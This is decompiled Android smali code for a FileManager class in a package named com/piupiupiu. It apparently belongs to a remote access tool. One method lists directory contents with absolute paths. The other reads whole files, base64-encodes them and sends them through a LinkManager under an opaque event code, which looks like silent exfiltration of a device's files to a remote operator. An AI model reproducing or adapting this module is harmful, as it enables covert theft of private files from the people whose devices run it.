.class public Lcom/piupiupiu/FileManager;
.super Ljava/lang/Object;
.source "FileManager.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static downloadFile(Ljava/lang/String;)V
    .locals 8
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 62
    if-nez p0, :cond_1

    .line 90
    :cond_0
    :goto_0
    return-void

    .line 65
    :cond_1
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 67
    .local v3, "file":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_0

    .line 69
    invoke-virtual {v3}, Ljava/io/File;->length()J

    move-result-wide v6

    long-to-int v5, v6

    .line 70
    .local v5, "size":I
    new-array v1, v5, [B

    .line 72
    .local v1, "data":[B
    :try_start_0
    new-instance v0, Ljava/io/BufferedInputStream;

    new-instance v6, Ljava/io/FileInputStream;

    invoke-direct {v6, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v6}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 73
    .local v0, "buf":Ljava/io/BufferedInputStream;
    const/4 v6, 0x0

    array-length v7, v1

    invoke-virtual {v0, v1, v6, v7}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 74
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 75
    .local v4, "object":Lorg/json/JSONObject;
    const-string v6, "file"

    const/4 v7, 0x1

    invoke-virtual {v4, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 76
    const-string v6, "name"

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 77
    const-string v6, "buffer"

    const/4 v7, 0x0

    invoke-static {v1, v7}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 78
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v6

    const-string v7, "m3b8tz"

    invoke-virtual {v6, v7, v4}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 79
    invoke-virtual {v0}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    goto :goto_0

    .line 80
    .end local v0    # "buf":Ljava/io/BufferedInputStream;
    .end local v4    # "object":Lorg/json/JSONObject;
    :catch_0
    move-exception v2

    .line 81
    .local v2, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v2}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    .line 82
    .end local v2    # "e":Ljava/io/FileNotFoundException;
    :catch_1
    move-exception v2

    .line 83
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 84
    .end local v2    # "e":Ljava/io/IOException;
    :catch_2
    move-exception v2

    .line 85
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static walk(Ljava/lang/String;)Lorg/json/JSONArray;
    .locals 11
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 28
    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6}, Lorg/json/JSONArray;-><init>()V

    .line 29
    .local v6, "values":Lorg/json/JSONArray;
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 30
    .local v0, "dir":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result v7

    if-nez v7, :cond_0

    .line 31
    const-string v7, "cannot"

    const-string v8, "inaccessible"

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 34
    :cond_0
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v4

    .line 36
    .local v4, "list":[Ljava/io/File;
    if-eqz v4, :cond_2

    .line 37
    :try_start_0
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 38
    .local v5, "parenttObj":Lorg/json/JSONObject;
    const-string v7, "name"

    const-string v8, "../"

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 39
    const-string v7, "isDir"

    const/4 v8, 0x1

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 40
    const-string v7, "fp"

    invoke-virtual {v0}, Ljava/io/File;->getParent()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 41
    invoke-virtual {v6, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 42
    array-length v8, v4

    const/4 v7, 0x0

    :goto_0
    if-ge v7, v8, :cond_2

    aget-object v2, v4, v7

    .line 43
    .local v2, "file":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v9

    const-string v10, "."

    invoke-virtual {v9, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-nez v9, :cond_1

    .line 44
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 45
    .local v3, "fileObj":Lorg/json/JSONObject;
    const-string v9, "name"

    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 46
    const-string v9, "isDir"

    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v10

    invoke-virtual {v3, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 47
    const-string v9, "fp"

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 48
    invoke-virtual {v6, v3}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 42
    .end local v3    # "fileObj":Lorg/json/JSONObject;
    :cond_1
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    .line 53
    .end local v2    # "file":Ljava/io/File;
    .end local v5    # "parenttObj":Lorg/json/JSONObject;
    :catch_0
    move-exception v1

    .line 54
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    .line 58
    .end local v1    # "e":Lorg/json/JSONException;
    :cond_2
    return-object v6
.end method
